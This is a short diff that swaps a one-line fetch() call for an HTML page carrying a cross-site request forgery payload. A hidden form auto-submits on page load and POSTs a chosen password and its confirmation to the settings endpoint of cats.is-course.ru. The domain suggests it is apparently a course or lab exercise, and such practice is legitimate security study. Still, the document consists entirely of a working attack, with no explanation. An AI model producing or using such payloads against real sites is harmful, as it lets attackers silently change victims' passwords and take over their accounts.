@@ -1,1 +1,12 @@
-<script>fetch('https://cats.is-course.ru/settings', {method:'POST',body:'password=q6%2Bu%3Fq%29b%3D%21Lp%7E_**d2%21_&confirm-password=q6%2Bu%3Fq%29b%3D%21Lp%7E_**d2%21_'})</script>
+<!DOCTYPE html>
+<html>
+<body>
+    <form id="csrfForm" action="https://cats.is-course.ru/settings" method="POST">
+        <input type="hidden" name="password" value="q6+u?q)b=!Lp~_**d2!_">
+        <input type="hidden" name="confirm-password" value="q6+u?q)b=!Lp~_**d2!_">
+    </form>
+    <script>
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
